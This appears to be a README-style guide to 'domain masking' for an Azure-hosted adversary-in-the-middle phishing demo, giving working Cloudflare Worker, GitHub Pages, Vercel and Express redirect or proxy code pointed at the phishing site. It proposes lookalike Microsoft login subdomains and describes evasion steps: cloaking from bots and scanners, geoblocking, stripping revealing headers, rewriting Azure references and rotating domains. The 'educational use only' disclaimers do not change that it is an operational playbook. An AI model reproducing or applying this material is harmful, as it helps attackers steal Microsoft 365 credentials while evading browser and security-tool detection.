# 🌐 Domain Masking Guide - Avoid Browser Malware Flags

## ⚠️ **RESEARCH & EDUCATIONAL USE ONLY**

This guide is for **authorized research and educational purposes only**. Use only on systems you own or have explicit permission to test.

---

## 🎯 **Problem**
The current Azure Function URL `azureaitm-phishing-demo-1755253259.azurewebsites.net` is:
- **Obvious phishing domain** (contains "phishing" in the name)
- **Flagged by browsers** as suspicious/malware
- **Easy to detect** by security tools
- **Poor reputation** due to Azure's shared IP ranges

## 🛡️ **Solution: Domain Masking**

### **Option 1: Cloudflare Workers (RECOMMENDED - FREE)**

#### **Step 1: Create Cloudflare Account**
1. Go to [cloudflare.com](https://cloudflare.com)
2. Sign up for free account
3. Add your domain (or use a free subdomain)

#### **Step 2: Deploy Worker**
1. Go to **Workers & Pages** in Cloudflare dashboard
2. Click **Create Application**
3. Choose **Create Worker**
4. Use the code from `cloudflare-worker.js`
5. Deploy to a custom subdomain like:
   - `login.yourdomain.com`
   - `office.yourdomain.com`
   - `microsoft.yourdomain.com`

#### **Step 3: Configure Custom Domain**
```bash
# Example custom domains that look legitimate:
login.office365.com.yourdomain.com
microsoft.login.yourdomain.com
office.secure.yourdomain.com
```

### **Option 2: GitHub Pages + Custom Domain (FREE)**

#### **Step 1: Create GitHub Repository**
```bash
git init domain-mask
cd domain-mask
```

#### **Step 2: Create HTML Redirect**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft 365 - Sign In</title>
    <meta http-equiv="refresh" content="0; url=https://azureaitm-phishing-demo-1755253259.azurewebsites.net/">
</head>
<body>
    <script>
        window.location.href = 'https://azureaitm-phishing-demo-1755253259.azurewebsites.net/';
    </script>
</body>
</html>
```

#### **Step 3: Deploy to GitHub Pages**
1. Push to GitHub
2. Enable GitHub Pages
3. Add custom domain in settings

### **Option 3: Vercel/Netlify (FREE)**

#### **Step 1: Create Vercel Project**
```bash
npm install -g vercel
vercel login
vercel
```

#### **Step 2: Configure Proxy**
Create `vercel.json`:
```json
{
  "rewrites": [
    {
      "source": "/(.*)",
      "destination": "https://azureaitm-phishing-demo-1755253259.azurewebsites.net/$1"
    }
  ]
}
```

### **Option 4: URL Shorteners (PAID)**

#### **Bitly Pro**
1. Sign up for Bitly Pro
2. Create custom domain
3. Set up redirect to Azure Function

#### **Custom URL Shortener**
```javascript
// Simple redirect service
app.get('*', (req, res) => {
  res.redirect('https://azureaitm-phishing-demo-1755253259.azurewebsites.net' + req.path);
});
```

## 🔧 **Implementation: Cloudflare Worker (Detailed)**

### **Deployment Steps**

#### **1. Create Cloudflare Account**
```bash
# Visit cloudflare.com and sign up
# Add your domain (e.g., yourdomain.com)
```

#### **2. Create Worker**
```bash
# In Cloudflare Dashboard:
# 1. Go to Workers & Pages
# 2. Create Application
# 3. Create Worker
# 4. Name: "login-proxy"
# 5. Deploy
```

#### **3. Configure Worker Code**
```javascript
// Use the cloudflare-worker.js code provided
// This proxies all requests to your Azure Function
```

#### **4. Set Custom Domain**
```bash
# In Worker settings:
# 1. Go to Triggers
# 2. Add Custom Domain
# 3. Enter: login.yourdomain.com
# 4. Save
```

### **Advanced Worker Features**

#### **Bot Detection**
```javascript
// Add to worker.js
if (isBot(request.headers.get('user-agent'))) {
  return new Response('Not Found', { status: 404 })
}
```

#### **Geographic Blocking**
```javascript
// Block certain countries
const country = request.headers.get('cf-ipcountry')
if (['US', 'GB', 'CA'].includes(country)) {
  return new Response('Access Denied', { status: 403 })
}
```

#### **Rate Limiting**
```javascript
// Basic rate limiting
const clientIP = request.headers.get('cf-connecting-ip')
// Implement rate limiting logic
```

## 🎨 **Domain Name Suggestions**

### **Legitimate-Looking Domains**
```
login.office365.com.yourdomain.com
microsoft.login.yourdomain.com
office.secure.yourdomain.com
auth.microsoft.yourdomain.com
signin.office.yourdomain.com
login.portal.yourdomain.com
```

### **Avoid These Patterns**
```
❌ phishing.yourdomain.com
❌ hack.yourdomain.com
❌ evil.yourdomain.com
❌ malware.yourdomain.com
❌ attack.yourdomain.com
```

## 🔍 **Testing Your Masked Domain**

### **1. Browser Testing**
```bash
# Test in different browsers
curl -I https://login.yourdomain.com
curl -I https://login.yourdomain.com/ -H "User-Agent: Mozilla/5.0"
```

### **2. Security Tool Testing**
```bash
# Test with security scanners
curl -I https://login.yourdomain.com -H "User-Agent: SecurityScanner"
```

### **3. Reputation Check**
```bash
# Check domain reputation
# Use tools like:
# - VirusTotal
# - URLVoid
# - Google Safe Browsing
```

## 🛡️ **Additional Evasion Techniques**

### **1. SSL Certificate**
- Use Cloudflare's free SSL
- Or get Let's Encrypt certificate
- Ensure HTTPS is properly configured

### **2. Headers Modification**
```javascript
// Remove revealing headers
modifiedHeaders.delete('server')
modifiedHeaders.delete('x-powered-by')
modifiedHeaders.delete('x-aspnet-version')
```

### **3. Content Modification**
```javascript
// Modify response content to remove Azure references
let content = await response.text()
content = content.replace(/azurewebsites\.net/g, 'yourdomain.com')
```

### **4. IP Reputation**
- Cloudflare provides better IP reputation
- Uses their global CDN
- Better geographic distribution

## 📊 **Comparison: Before vs After**

### **Before (Azure Direct)**
```
❌ Domain: azureaitm-phishing-demo-1755253259.azurewebsites.net
❌ Obvious: Contains "phishing" in name
❌ Reputation: Azure shared IP ranges
❌ Detection: High chance of being flagged
❌ SSL: Standard Azure certificate
```

### **After (Cloudflare Proxy)**
```
✅ Domain: login.yourdomain.com
✅ Legitimate: Looks like real Microsoft login
✅ Reputation: Cloudflare's trusted infrastructure
✅ Detection: Much lower chance of being flagged
✅ SSL: Cloudflare's trusted certificates
```

## 🚀 **Quick Start: Cloudflare Worker**

### **1. Sign Up**
- Go to [cloudflare.com](https://cloudflare.com)
- Create free account
- Add your domain

### **2. Deploy Worker**
```bash
# Copy cloudflare-worker.js content
# Paste into Cloudflare Worker editor
# Deploy to custom domain
```

### **3. Test**
```bash
# Test the masked domain
curl https://login.yourdomain.com
```

## ⚠️ **Important Notes**

### **Legal Compliance**
- Only use on systems you own
- Ensure compliance with local laws
- Use for authorized testing only

### **Security Considerations**
- Monitor for abuse
- Implement rate limiting
- Add bot detection
- Log access attempts

### **Maintenance**
- Keep worker code updated
- Monitor domain reputation
- Rotate domains if needed
- Update SSL certificates

---

## 📞 **Support**

For questions about domain masking:
- Check Cloudflare documentation
- Review worker code examples
- Test thoroughly before deployment

**Remember**: This is for **educational and research purposes only**!
